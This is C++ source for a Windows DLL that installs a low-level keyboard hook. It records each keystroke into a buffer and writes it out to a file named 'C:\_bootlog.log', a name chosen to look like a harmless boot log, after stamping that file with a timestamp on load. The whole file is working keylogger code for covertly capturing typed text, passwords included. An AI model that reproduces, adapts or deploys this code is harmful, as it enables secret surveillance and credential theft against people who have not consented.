// dllHook.cpp : Defines the entry point for the DLL application.
//
#include "stdafx.h"
#include "BFileW32.h"
#include <time.h>
#include <stdlib.h>
#include <stdio.h>

CBFile	fichier;
char	buffer[1024];
int		cptBuffer;


bool	gbCapsStatus;


bool	gbLogicShift;
bool	gbLogicCaps;

bool	gbBlocKeys;
__declspec(dllexport) LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);


LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
char temp[32];

	memset(temp, 0, 32);

	if(nCode == HC_ACTION){
		if(wParam == WM_KEYDOWN){
			KBDLLHOOKSTRUCT *stKeyDown= (KBDLLHOOKSTRUCT *)lParam;

//			sprintf(temp, "%02X Down", (unsigned char)stKeyDown->vkCode);
//			MessageBox(0, temp, temp, 0);

			switch((unsigned char)stKeyDown->vkCode){
			//Ignored keys
			case 0x03:case 0x13:case 0x1B:case 0x21:case 0x22:case 0x23:	
			case 0x24:case 0x25:case 0x26:case 0x27:case 0x28:case 0x2C:	
			case 0x2D:case 0x2E:case 0x5D:case 0x5F:case 0x70:case 0x71:	
			case 0x72:case 0x73:case 0x74:case 0x75:case 0x76:case 0x77:	
			case 0x78:case 0x7A:case 0x7B:case 0x90:case 0x91:case 0xAC:	
			case 0xB0:case 0xB1:case 0xB2:case 0xB3:case 0xFF:	
				break;
			case 0x5B:	//Block input keys
			case 0xA5:
			case 0xA4:
			case 0xA3:
			case 0xA2:
				gbBlocKeys= true;
				break;
			case 0x14:	//Caps lock
				if(gbLogicCaps)
					break;

				gbCapsStatus= !gbCapsStatus;
				gbLogicCaps= true;
			break;
			case 0xA0:	//Shifts
			case 0xA1:
				if(gbLogicShift)
					break;

				gbLogicShift= true;
				gbCapsStatus= !gbCapsStatus;
			break;
			}
		}
		else if(wParam == WM_KEYUP){
			KBDLLHOOKSTRUCT *stKeyUp= (KBDLLHOOKSTRUCT *)lParam;

//			sprintf(temp, "%02X Up", (unsigned char)stKeyUp->vkCode);
//			MessageBox(0, temp, temp, 0);

			switch((unsigned char)stKeyUp->vkCode){
			//Ignored keys
			case 0x03:case 0x13:case 0x1B:case 0x21:case 0x22:case 0x23:	
			case 0x24:case 0x25:case 0x26:case 0x27:case 0x28:case 0x2C:	
			case 0x2D:case 0x2E:case 0x5D:case 0x5F:case 0x70:case 0x71:	
			case 0x72:case 0x73:case 0x74:case 0x75:case 0x76:case 0x77:	
			case 0x78:case 0x7A:case 0x7B:case 0x90:case 0x91:case 0xAC:	
			case 0xB0:case 0xB1:case 0xB2:case 0xB3:case 0xFF:	
				break;
			case 0x5B:	//Block input keys
			case 0xA5:
			case 0xA4:
			case 0xA3:
			case 0xA2:
				gbBlocKeys= false;
				break;
			case 0xA0:	//Shifts
			case 0xA1:
				gbCapsStatus= !gbCapsStatus;
				gbLogicShift= false;
			break;
			case 0x14:
				gbLogicCaps= false;
			break;
			//Special Keys
			case 0x08:
				memcpy(&buffer[cptBuffer], "[BKSPC]", 7);
				cptBuffer+= 7;
				break;
			case 0x0D:
				buffer[cptBuffer++]= (char)0x0D;
				buffer[cptBuffer++]= (char)0x0A;
			break;
			default:
				if(gbBlocKeys)
					break;
				if(gbCapsStatus){
					buffer[cptBuffer++]= (char)stKeyUp->vkCode;
				}else{
					buffer[cptBuffer++]= tolower((char)stKeyUp->vkCode);
				}
			break;
			}

			if(cptBuffer >= 10){
				fichier.OpenWrite();
				fichier.Write(buffer, cptBuffer);
				fichier.Close();
				cptBuffer=0;
			}
		}
	}

	return 0;
}


BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, void *lpReserved)
{
SYSTEMTIME time;

	strcpy((char*)fichier.m_filename, "C:\\_bootlog.log");

	memset(buffer, 0, 1024);
	cptBuffer= 0;

	gbLogicShift= false;
	gbLogicCaps= false;
	gbBlocKeys= false;

	gbCapsStatus= bool(::GetKeyState(VK_CAPITAL) > 0);

	GetLocalTime(&time);
	sprintf(buffer, "\r\n\r\n%04d%02d%02d%02d%02d%02dL\r\n\r\n", time.wYear, time.wMonth, time.wDay, time.wHour, time.wMinute, time.wSecond);

	fichier.OpenWrite();
	fichier.Write(buffer, 23);
	fichier.Close();

    return TRUE;
}
